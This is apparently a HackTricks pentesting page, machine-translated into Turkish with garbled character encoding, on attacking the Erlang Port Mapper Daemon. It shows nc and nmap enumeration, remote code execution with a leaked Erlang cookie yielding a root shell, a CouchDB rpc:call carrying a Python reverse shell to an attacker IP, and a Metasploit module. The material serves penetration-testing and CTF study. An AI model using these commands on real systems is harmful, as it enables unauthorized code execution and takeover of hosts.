<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman olmaya Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARI'na**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>


# Temel Bilgiler

**Erlang Port Mapper Daemon (epmd)**, daÄŸÄ±tÄ±lmÄ±ÅŸ Erlang Ã¶rnekleri iÃ§in bir koordinatÃ¶r olarak hizmet eder. Sembolik dÃ¼ÄŸÃ¼m adlarÄ±nÄ± makine adreslerine eÅŸler ve her dÃ¼ÄŸÃ¼m adÄ±nÄ±n belirli bir adresle iliÅŸkilendirildiÄŸini saÄŸlar. **epmd**'nin bu rolÃ¼, farklÄ± Erlang dÃ¼ÄŸÃ¼mleri arasÄ±ndaki sorunsuz etkileÅŸim ve iletiÅŸim iÃ§in Ã¶nemlidir.

**VarsayÄ±lan port**: 4369
```
PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
```
Bu, varsayÄ±lan olarak RabbitMQ ve CouchDB kurulumlarÄ±nda kullanÄ±lÄ±r.

# NumaralandÄ±rma

## El ile
```bash
echo -n -e "\x00\x01\x6e" | nc -vn <IP> 4369

#Via Erlang, Download package from here: https://www.erlang-solutions.com/resources/download.html
dpkg -i esl-erlang_23.0-1~ubuntu~xenial_amd64.deb
apt-get install erlang
erl #Once Erlang is installed this will promp an erlang terminal
1> net_adm:names('<HOST>'). #This will return the listen addresses
```
## Otomatik

Erlang Port Mapper Daemon (EPMD), Erlang dilinde yazÄ±lmÄ±ÅŸ bir sunucu uygulamasÄ±dÄ±r. EPMD, Erlang daÄŸÄ±tÄ±lmÄ±ÅŸ sistemlerindeki sunucularÄ±n bulunmasÄ±nÄ± ve iletiÅŸim kurmasÄ±nÄ± saÄŸlar. Bu, Erlang tabanlÄ± uygulamalarÄ±n birbirleriyle iletiÅŸim kurmasÄ±nÄ± kolaylaÅŸtÄ±rÄ±r.

EPMD, varsayÄ±lan olarak TCP 4369 portunda Ã§alÄ±ÅŸÄ±r. Bu nedenle, bir hedefin EPMD'yi kullanÄ±p kullanmadÄ±ÄŸÄ±nÄ± belirlemek iÃ§in bu portu taramak Ã¶nemlidir.

EPMD, bir saldÄ±rganÄ±n hedef sistemdeki Erlang sunucularÄ±nÄ± keÅŸfetmesine ve saldÄ±rÄ± yapmasÄ±na olanak tanÄ±r. SaldÄ±rgan, EPMD'yi hedef sistemde Ã§alÄ±ÅŸtÄ±ran sunucularÄ±n listesini alabilir ve bu sunuculara saldÄ±rÄ± yapabilir.

EPMD'yi hedef sistemde taramak iÃ§in otomatik araÃ§lar kullanÄ±labilir. Bu araÃ§lar, EPMD'yi taramak ve sunucularÄ±n listesini almak iÃ§in otomatik olarak TCP 4369 portunu kontrol eder. Bu, saldÄ±rganÄ±n hedef sistemdeki Erlang sunucularÄ±nÄ± keÅŸfetmesini kolaylaÅŸtÄ±rÄ±r ve saldÄ±rÄ± yapma potansiyelini artÄ±rÄ±r.

EPMD tarama araÃ§larÄ±, saldÄ±rganlara hedef sistemdeki Erlang sunucularÄ±nÄ± keÅŸfetme ve saldÄ±rÄ± yapma yeteneÄŸi saÄŸlar. Bu nedenle, bir sistem yÃ¶neticisi olarak, EPMD'yi korumak iÃ§in gÃ¼venlik Ã¶nlemleri almanÄ±z Ã¶nemlidir. Bu Ã¶nlemler arasÄ±nda EPMD'yi gÃ¼venli bir ÅŸekilde yapÄ±landÄ±rmak, gereksiz sunucularÄ± kapatmak ve gÃ¼venlik duvarÄ± kurallarÄ±yla EPMD trafiÄŸini sÄ±nÄ±rlamak bulunur.
```bash
nmap -sV -Pn -n -T4 -p 4369 --script epmd-info <IP>

PORT     STATE SERVICE VERSION
4369/tcp open  epmd    Erlang Port Mapper Daemon
| epmd-info:
|   epmd_port: 4369
|   nodes:
|     bigcouch: 11502
|     freeswitch: 8031
|     ecallmgr: 11501
|     kazoo_apps: 11500
|_    kazoo-rabbitmq: 25672
```
# Erlang Cookie RCE

## Uzaktan BaÄŸlantÄ±

EÄŸer **Kimlik DoÄŸrulama Ã§erezi sÄ±zdÄ±rabilirseniz**, ana bilgisayarda kodu Ã§alÄ±ÅŸtÄ±rabilirsiniz. Genellikle bu Ã§erez `~/.erlang.cookie` dosyasÄ±nda bulunur ve erlang tarafÄ±ndan ilk baÅŸlatÄ±ldÄ±ÄŸÄ±nda oluÅŸturulur. Elle deÄŸiÅŸtirilmediyse veya ayarlanmadÄ±ysa, uzunluÄŸu 20 karakter olan rastgele bir dize \[A:Z] olarak oluÅŸturulur.
```bash
greif@baldr ~$ erl -cookie YOURLEAKEDCOOKIE -name test2 -remsh test@target.fqdn
Erlang/OTP 19 [erts-8.1] [source] [64-bit] [async-threads:10]

Eshell V8.1 (abort with ^G)

At last, we can start an erlang shell on the remote system.

(test@target.fqdn)1>os:cmd("id").
"uid=0(root) gid=0(root) groups=0(root)\n"
```
Daha fazla bilgi iÃ§in [https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/](https://insinuator.net/2017/10/erlang-distribution-rce-and-a-cookie-bruteforcer/) adresine bakabilirsiniz.\
Yazar ayrÄ±ca Ã§erezin kaba kuvvet saldÄ±rÄ±sÄ± iÃ§in bir program paylaÅŸÄ±yor:

{% file src="../.gitbook/assets/epmd_bf-0.1.tar.bz2" %}

## Yerel BaÄŸlantÄ±

Bu durumda, ayrÄ±calÄ±klarÄ± yerel olarak yÃ¼kseltmek iÃ§in CouchDB'yi kÃ¶tÃ¼ye kullanacaÄŸÄ±z:
```bash
HOME=/ erl -sname anonymous -setcookie YOURLEAKEDCOOKIE
(anonymous@canape)1> rpc:call('couchdb@localhost', os, cmd, [whoami]).
"homer\n"
(anonymous@canape)4> rpc:call('couchdb@localhost', os, cmd, ["python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.9\", 9005));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"]).
```
Ã–rnek [https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution) adresinden alÄ±nmÄ±ÅŸtÄ±r. Bu zafiyeti nasÄ±l sÃ¶mÃ¼rÃ¼leceÄŸini Ã¶ÄŸrenmek iÃ§in **Canape HTB makinesini** kullanabilirsiniz.

## Metasploit
```bash
#Metasploit can also exploit this if you know the cookie
msf5> use exploit/multi/misc/erlang_cookie_rce
```
# Shodan

* `port:4369 "portta"`


<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahramana kadar Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELÄ°K PLANLARINA**](https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'Ä± takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>
